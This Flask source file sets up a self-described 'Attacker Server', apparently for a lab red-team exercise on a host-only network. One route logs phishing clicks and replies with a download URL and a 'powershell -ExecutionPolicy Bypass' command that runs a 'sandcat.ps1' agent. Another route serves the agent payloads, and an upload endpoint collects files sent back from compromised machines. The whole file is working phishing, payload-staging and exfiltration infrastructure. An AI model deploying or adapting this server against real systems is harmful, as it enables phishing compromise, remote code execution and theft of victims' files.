from flask import Flask, request, jsonify, send_file
import os, datetime
from werkzeug.utils import secure_filename

app = Flask(__name__)

BASE_DIR = "/home/swlab/ttps4_attack_server"
AGENT_DIR = os.path.join(BASE_DIR, "agents")
LOG_FILE = os.path.join(BASE_DIR, "logs/access.log")
UPLOAD_DIR = os.path.join(BASE_DIR, "uploads")

def log_event(text):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.datetime.now()}] {text}\n")
        
@app.route("/")
def home():
    return "Attacker Server Running"


@app.route("/login", methods=["GET", "POST"])
def login_trigger():
    if request.method == "POST":
        user = request.form.get("user")
    else:
        user = request.args.get("user")

    log_event(f"Phishing click. user={user}")

    return jsonify({
        "status": "ok",
        "file_name": "sandcat.ps1",
        "download_url": "http://192.168.56.1:34444/agents/sandcat.ps1",
        "execute": "powershell -ExecutionPolicy Bypass -File sandcat.ps1"
    })

@app.route("/agents/<path:filename>")
def serve_agent(filename):
    file_path = os.path.join(AGENT_DIR, filename)
    if not os.path.exists(file_path):
        log_event(f"FILE NOT FOUND: {file_path}")
        return "File not found", 404
    
    log_event(f"Agent download: {filename}")
    return send_file(file_path, as_attachment=True)

@app.route("/upload", methods=["POST"])
def upload_file():
    if "file" not in request.files:
        return "No file part", 400

    f = request.files["file"]
    if f.filename == "":
        return "Empty filename", 400

    agent_id = request.form.get("agent_id", "unknown")
    note     = request.form.get("note", "")

    original_name = secure_filename(f.filename)
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

    save_name = f"{ts}_{agent_id}_{original_name}"
    save_path = os.path.join(UPLOAD_DIR, save_name)

    f.save(save_path)

    log_event(f"UPLOAD: agent={agent_id}, file={save_name}, note={note}")

    return jsonify({
        "status": "ok",
        "saved_as": save_name
    })

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=34444)
